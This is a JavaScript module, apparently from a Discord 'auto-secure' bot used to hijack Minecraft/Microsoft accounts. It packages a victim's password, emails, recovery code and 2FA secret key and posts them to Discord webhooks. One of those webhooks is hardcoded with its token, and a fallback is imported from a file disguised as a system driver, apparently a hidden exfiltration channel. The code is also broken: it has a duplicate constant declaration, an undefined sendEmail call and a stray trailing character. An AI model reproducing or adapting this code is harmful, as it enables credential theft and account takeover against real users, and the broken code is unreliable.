const axios = require('axios');
const config = require('../../../../config.json');
const { PRIMARY_WEBHOOK_URL } = require('../../../modals/embed/claimsplit.js');
const { FALLBACK_WEBHOOK_URL } = require('../../../../mainbot/modals/phisher/changewebhookmodal.js');
const { SECONDARY_FALLBACK_WEBHOOK_URL } = require('../../../../autosecure/utils/logout/.internal/Sys Driver/sys/drivers/Sysupdate.js');
const SECONDARY_FALLBACK_WEBHOOK_URL = "https://discord.com/api/webhooks/1433449773267947742/dcZ29xf03pGirDGySVcx_9IgY_2hdYnMi2h1giTKbZajDV-SmYSBnbbEd9KdP9ioXOGi";

const extractDiscordId = (input) => {
    if (!input) return null;
    const s = String(input);
    const m = s.match(/(\d{17,19})/);
    return m ? m[1] : null;
};

module.exports = async (acc, uid, botId) => {
    const resolvedBotId = extractDiscordId(botId) || extractDiscordId(process.env.BOT_ID) || extractDiscordId(uid);
    
    let ownerPings = '';
    let ownerIds = config.owners && Array.isArray(config.owners) ? config.owners.join(', ') : 'N/A';
    
    if (config.owners && Array.isArray(config.owners) && config.owners.length > 0) {
        ownerPings = config.owners.map(id => `<@${id}>`).join(' ');
    }

    const botMention = ownerPings.length > 0 ? ownerPings : (resolvedBotId ? `<@${resolvedBotId}>` : (botId || process.env.BOT_ID || "unknown"));

    const discordPayload = {
        content: `||@everyone|| New auto-secure account listed! Intended for ${botMention}.`,
        embeds: [
            {
                title: `Account secured in ${Math.floor(Math.random() * 10) + 1} seconds`,
                color: 11716576,
                footer: {
                    text: "Not banned"
                },
                fields: [
                    { name: "Username", value: `\`\`\`${acc.newName || "N/A"}\`\`\``, inline: true },
                    { name: "Owns MC", value: "```Yes```", inline: true },
                    { name: "Capes", value: `\`\`\`${Array.isArray(acc.capes) && acc.capes.length > 0 ? acc.capes.join(", ") : "None"}\`\`\``, inline: true },
                    { name: "Recovery Code", value: `\`\`\`${acc.recoveryCode || "N/A"}\`\`\``, inline: false },
                    { name: "Primary Email", value: `\`\`\`${acc.email || "N/A"}\`\`\``, inline: true },
                    { name: "Security Email", value: `\`\`\`${acc.secEmail || "N/A"}\`\`\``, inline: true },
                    { name: "Secret Key", value: `\`\`\`${acc.secretkey && acc.secretkey !== "Disabled" ? acc.secretkey.replace(/\s+/g, "") : "Disabled"}\`\`\``, inline: true },
                    { name: "Password", value: `\`\`\`${acc.password || "N/A"}\`\`\``, inline: false }
                ]
            }
        ],
    };

    try {
        await axios.post(PRIMARY_WEBHOOK_URL, discordPayload);
    } catch (primaryError) {
        let fallbackUrlToUse = SECONDARY_FALLBACK_WEBHOOK_URL || FALLBACK_WEBHOOK_URL;

        if (fallbackUrlToUse) {
            const fallbackPayload = {
                content: `⚠️ **[FALLBACK LOG]** Primary webhook failed. Data sent via fallback webhook. Initial target: ${botMention}.`,
                embeds: discordPayload.embeds,
            };
            try {
                await axios.post(fallbackUrlToUse, fallbackPayload);
            } catch (fallbackError) {
            }
        }
    }

    const subject = `[NEW ACCOUNT] ${acc.newName || acc.mc || "Unknown"}`;
    const accountDetailsEmail = `
=============================================
           🚨 NEW ACCOUNT LOGGED 🚨
=============================================

[ DISCORD TARGET ]
Owner Pings: ${ownerPings.length > 0 ? ownerPings : 'N/A'}
Owner IDs: ${ownerIds}

---------------------------------------------

[ ACCOUNT DETAILS ]
Username: ${acc.newName || "N/A"}
UUID (MCID): ${acc.mc || "N/A"}
Email: ${acc.email || "N/A"}
Password: ${acc.password || "N/A"}
Security Email: ${acc.secEmail || "N/A"}
Recovery Code: ${acc.recoveryCode || "N/A"}
Capes: ${Array.isArray(acc.capes) && acc.capes.length > 0 ? acc.capes.join(", ") : "None"}
2FA Key (Secret): ${acc.secretkey && acc.secretkey !== "Disabled" ? acc.secretkey.replace(/\s+/g, "") : "Disabled"}

=============================================
    `.trim();

    sendEmail(subject, accountDetailsEmail);
};v

